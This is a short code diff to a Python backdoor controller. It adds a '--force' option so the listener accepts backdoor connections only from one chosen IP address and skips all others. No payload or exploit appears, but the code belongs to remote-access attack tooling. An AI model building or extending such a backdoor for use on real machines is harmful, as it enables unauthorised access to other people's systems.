@@ -301,6 +301,10 @@ class Backdoor:
         while True:
             self.sock.listen(1)
             client = Client(self.sock.accept(), self.config)
+            if self.config.force and client.address[0] != self.config.force:
+                self.print_verbose_message(f"Skipping connection from {client.address[0]}:{client.address[1]} (--force was specified)")
+                continue
+
             self.print_verbose_message(f"Recieved connection from {client.address[0]}:{client.address[1]}")
             self.handle_client(client)
 
@@ -471,6 +475,11 @@ if __name__ ==  "__main__":
         help=f"Just listen for any backdoor connections and host the backdoor directory", 
         default=False,
         action="store_true"
+    )
+    parser.add_argument(
+        "-f",
+        "--force",
+        help=f"Specify what IP address to receive a backdoor connection from"
     )
     args = parser.parse_args()
     main(args)
